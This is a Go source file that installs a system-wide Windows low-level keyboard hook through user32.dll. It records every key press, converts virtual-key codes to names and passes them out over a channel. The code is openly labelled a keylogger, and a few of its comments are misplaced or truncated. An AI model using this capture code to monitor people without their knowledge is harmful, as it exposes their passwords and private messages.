package keylogger

import (
	"fmt"
	"syscall"
	"unsafe"
)

// String returns a human-friendly display name of the hotkey
// such as "Hotkey[Id: 1, Alt+Ctrl+O]"
var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procSetWindowsHookEx    = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetMessage          = user32.NewProc("GetMessageW")
	keyboardHook            HHOOK
)

const (
	WH_KEYBOARD_LL = 13
	WH_KEYBOARD    = 2
	WM_KEYDOWN     = 256
	WM_SYSKEYDOWN  = 260
	WM_KEYUP       = 257
	WM_SYSKEYUP    = 261
	WM_KEYFIRST    = 256
	WM_KEYLAST     = 264
	PM_NOREMOVE    = 0x000
	PM_REMOVE      = 0x001
	PM_NOYIELD     = 0x002
	WM_LBUTTONDOWN = 513
	WM_RBUTTONDOWN = 516
	NULL           = 0
)

type (
	DWORD     uint32
	WPARAM    uintptr
	LPARAM    uintptr
	LRESULT   uintptr
	HANDLE    uintptr
	HINSTANCE HANDLE
	HHOOK     HANDLE
	HWND      HANDLE
)

// HOOKPROC .
type HOOKPROC func(int, WPARAM, LPARAM) LRESULT

// KBDLLHOOKSTRUCT .
type KBDLLHOOKSTRUCT struct {
	VkCode      DWORD
	ScanCode    DWORD
	Flags       DWORD
	Time        DWORD
	DwExtraInfo uintptr
}

// POINT struct used by GetMessage
// http://msdn.microsoft.com/en-us/library/windows/desktop/dd162805.aspx
type POINT struct {
	X, Y int32
}

// MSG used by GetMessage
// http://msdn.microsoft.com/en-us/library/windows/desktop/ms644958.aspx
type MSG struct {
	Hwnd    HWND
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      POINT
}

// SetWindowsHookEx is the key listener that fires when the user presses a key
func SetWindowsHookEx(idHook int, lpfn HOOKPROC, hMod HINSTANCE, dwThreadId DWORD) HHOOK {
	ret, _, _ := procSetWindowsHookEx.Call(
		uintptr(idHook),
		uintptr(syscall.NewCallback(lpfn)),
		uintptr(hMod),
		uintptr(dwThreadId),
	)
	return HHOOK(ret)
}

// CallNextHookEx should be fired at the end of a HOOKPROC in a SetWindowsHookEx
func CallNextHookEx(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
	ret, _, _ := procCallNextHookEx.Call(
		uintptr(hhk),
		uintptr(nCode),
		uintptr(wParam),
		uintptr(lParam),
	)
	return LRESULT(ret)
}

// UnhookWindowsHookEx removes the listener
func UnhookWindowsHookEx(hhk HHOOK) bool {
	ret, _, _ := procUnhookWindowsHookEx.Call(
		uintptr(hhk),
	)
	return ret != 0
}

// GetMessage triggers the listener
func GetMessage(msg *MSG, hwnd HWND, msgFilterMin uint32, msgFilterMax uint32) int {
	ret, _, _ := procGetMessage.Call(
		uintptr(unsafe.Pointer(msg)),
		uintptr(hwnd),
		uintptr(msgFilterMin),
		uintptr(msgFilterMax))
	return int(ret)
}

// StartKeylogger starts the key listener
func StartKeylogger(ch chan<- KeylogFunc) {
	// defer user32.Release()
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		(HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
			// if nCode == 0 && wparam == WM_KEYDOWN {
			if wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN {
				key, isSingle := GetKey(wparam, lparam)
				ch <- func() (string, bool) {
					return key, isSingle
				}

			}
			return CallNextHookEx(keyboardHook, nCode, wparam, lparam)
		}), 0, 0)

	var msg MSG
	for GetMessage(&msg, 0, 0, 0) != 0 {
	}

	UnhookWindowsHookEx(keyboardHook)
	keyboardHook = 0
}

// GetKey will process the keys and print the key in
// a string format
func GetKey(w WPARAM, lparam LPARAM) (string, bool) {
	kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
	vk := byte(kbdstruct.VkCode)
	key, isSingle := GetVKey(vk)
	return key, isSingle
}

// Keys have been extracted with Regex from the pynput library and slightly modified
// pyinput: https://github.com/moses-palmer/pynput/blob/master/lib/pynput/_util/win32_vks.py
var Keys = map[byte]string{
	1:   "LBUTTON",
	2:   "RBUTTON",
	3:   "CANCEL",
	4:   "MBUTTON",
	5:   "XBUTTON1",
	6:   "XBUTTON2",
	8:   "BACK",
	9:   "TAB",
	12:  "CLEAR",
	13:  "RETURN",
	16:  "SHIFT",
	17:  "CONTROL",
	18:  "MENU",
	19:  "PAUSE",
	20:  "CAPITAL",
	21:  "HANGUL",
	23:  "JUNJA",
	24:  "FINAL",
	25:  "KANJI",
	27:  "ESCAPE",
	28:  "CONVERT",
	29:  "NONCONVERT",
	30:  "ACCEPT",
	31:  "MODECHANGE",
	32:  "SPACE",
	33:  "PRIOR",
	34:  "NEXT",
	35:  "END",
	36:  "HOME",
	37:  "LEFT",
	38:  "UP",
	39:  "RIGHT",
	40:  "DOWN",
	41:  "SELECT",
	42:  "PRINT",
	43:  "EXECUTE",
	44:  "SNAPSHOT",
	45:  "INSERT",
	46:  "DELETE",
	47:  "HELP",
	91:  "LWIN",
	92:  "RWIN",
	93:  "APPS",
	95:  "SLEEP",
	96:  "NUMPAD0",
	97:  "NUMPAD1",
	98:  "NUMPAD2",
	99:  "NUMPAD3",
	100: "NUMPAD4",
	101: "NUMPAD5",
	102: "NUMPAD6",
	103: "NUMPAD7",
	104: "NUMPAD8",
	105: "NUMPAD9",
	106: "MULTIPLY",
	107: "ADD",
	108: "SEPARATOR",
	109: "SUBTRACT",
	110: "DECIMAL",
	111: "DIVIDE",
	144: "NUMLOCK",
	145: "SCROLL",
	146: "OEM_FJ_JISHO",
	147: "OEM_FJ_MASSHOU",
	148: "OEM_FJ_TOUROKU",
	149: "OEM_FJ_LOYA",
	150: "OEM_FJ_ROYA",
	160: "LSHIFT",
	161: "RSHIFT",
	162: "LCONTROL",
	163: "RCONTROL",
	164: "LMENU",
	165: "RMENU",
	166: "BROWSER_BACK",
	167: "BROWSER_FORWARD",
	168: "BROWSER_REFRESH",
	169: "BROWSER_STOP",
	170: "BROWSER_SEARCH",
	171: "BROWSER_FAVORITES",
	172: "BROWSER_HOME",
	173: "VOLUME_MUTE",
	174: "VOLUME_DOWN",
	175: "VOLUME_UP",
	176: "MEDIA_NEXT_TRACK",
	177: "MEDIA_PREV_TRACK",
	178: "MEDIA_STOP",
	179: "MEDIA_PLAY_PAUSE",
	180: "LAUNCH_MAIL",
	181: "LAUNCH_MEDIA_SELECT",
	182: "LAUNCH_APP1",
	183: "LAUNCH_APP2",
	186: "OEM_1",
	187: "OEM_PLUS",
	188: "OEM_COMMA",
	189: "OEM_MINUS",
	190: "OEM_PERIOD",
	191: "OEM_2",
	192: "OEM_3",
	219: "OEM_4",
	220: "OEM_5",
	221: "OEM_6",
	222: "OEM_7",
	223: "OEM_8",
	225: "OEM_AX",
	226: "OEM_102",
	227: "ICO_HELP",
	228: "ICO_00",
	229: "PROCESSKEY",
	230: "ICO_CLEAR",
	231: "PACKET",
	233: "OEM_RESET",
	234: "OEM_JUMP",
	235: "OEM_PA1",
	236: "OEM_PA2",
	237: "OEM_PA3",
	238: "OEM_WSCTRL",
	239: "OEM_CUSEL",
	240: "OEM_ATTN",
	241: "OEM_FINISH",
	242: "OEM_COPY",
	243: "OEM_AUTO",
	244: "OEM_ENLW",
	245: "OEM_BACKTAB",
	246: "ATTN",
	247: "CRSEL",
	248: "EXSEL",
	249: "EREOF",
	250: "PLAY",
	251: "ZOOM",
	252: "NONAME",
	253: "PA1",
	254: "OEM_CLEAR",
}

// GetVKey converts the byte key and converts it to a string value
func GetVKey(code byte) (value string, isSingle bool) {
	key, ok := Keys[code]
	switch {
	case ok:
		return key, false
	// 0-9
	case code >= 48 && code <= 57:
		fallthrough
	// a-z
	case code >= 65 && code <= 90:
		c := fmt.Sprintf("%q", code)
		// trim the quotation marks
		return c[1 : len(c)-1], true
	// f1-f24
	case code >= 112 && code <= 135:
		return fmt.Sprintf("F%d", code-111), false

	default:
		return "", false
	}
}

// KeylogFunc is the type of the r
type KeylogFunc func() (string, bool)
